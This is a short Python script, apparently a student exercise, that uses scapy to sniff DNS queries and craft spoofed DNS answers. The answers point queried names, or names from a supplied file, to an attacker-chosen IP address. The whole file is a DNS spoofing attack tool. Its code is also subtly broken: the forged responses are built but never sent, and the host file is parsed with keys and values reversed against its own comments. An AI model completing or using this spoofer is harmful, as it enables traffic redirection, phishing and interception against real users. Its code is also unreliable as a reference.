# Bryanna Martinez

from scapy.all import *
import argparse

INTERFACE = "lo" # default interface
HOSTNAME = "192.119.67.127" # default hostname

# dictionary for IPs and hostnames
host = {}

# function to read in file
def read_file(f_name):
    # open file to read
    f = open(f_name,'r')
    line = f.readlines()

    # stores values into dictionary
    for l in line:
        # if statement to remove newline from text
        if '\n' in l:
            l = l[:-1]

        sline = l.split(',')      # splits line into a list [hostname,ip]
        host[sline[1]] = sline[0] # stores into dictionary {hostname : ip}

    print(host)

# parameter pkt: IP is for who we are sending packet back to
def get_packet(pkt: IP):
    if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
        # checks if file hostnames was entered
        if len(host) == 0:
            # spoofed response
            resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=HOSTNAME)/DNSRR(rrname='supercook.com',rdata=HOSTNAME))
        else:
            for k in host:
                if k in str(pkt['DNS Question Record'].qname):
                    # spoofed response
                    pkt.show()
                    resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=host[k])/DNSRR(rrname=k,rdata=host[k]))
                    resp.show()

if __name__== "__main__":
    parser = argparse.ArgumentParser(description="options to give interface and/or hostname", add_help=False)
    parser.add_argument("-i")
    parser.add_argument("-h")

    argument = parser.parse_args()

    if argument.i:
        print('i was typed: {0}'.format(argument.i))
        INTERFACE = argument.i
    else:
        print("oh no, no i was typed")
    if argument.h:
        print('h was typed: {0}'.format(argument.h))
        read_file(argument.h)
    else:
        print("oh no, no h was typed")

    sniff(filter="udp port 53",prn=get_packet,iface=INTERFACE)
